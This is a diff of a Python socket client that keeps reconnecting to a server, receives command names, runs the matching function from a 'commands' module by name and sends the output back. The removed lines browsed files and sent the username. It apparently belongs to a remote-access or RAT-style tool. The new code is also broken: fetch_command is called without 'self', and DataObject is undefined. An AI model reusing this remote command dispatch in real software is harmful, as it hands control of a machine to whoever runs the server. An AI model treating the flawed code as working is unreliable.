@@ -2,8 +2,8 @@ import socket
 import time
 import os
 import stat
-import subprocess
 
+import commands
 
 class Client:
 
@@ -13,16 +13,14 @@ class Client:
         self.host = host
 
     def run(self):
-
         self.connect_server()
         while True:
-            data = self.socket.recv(4096)
+            data = DataObject(self.socket.recv(4096))
 
             if data:
-                if data == '1':
-                    FileBrowser(self).run()
-                if data == '2':
-                    self.socket.sendall(os.getenv("USERNAME"))
+                command = fetch_command(data.command)
+                datos = command(data.args)
+                self.socket.sendall(datos)
             else:
                 print("Connection lost.")
                 self.connect_server()
@@ -40,6 +38,8 @@ class Client:
                 print("Trying to connect...")
                 time.sleep(1)
 
+    def fetch_command(self, command_name):
+        return getattr(commands, command_name)
 
 class FileBrowser:
 
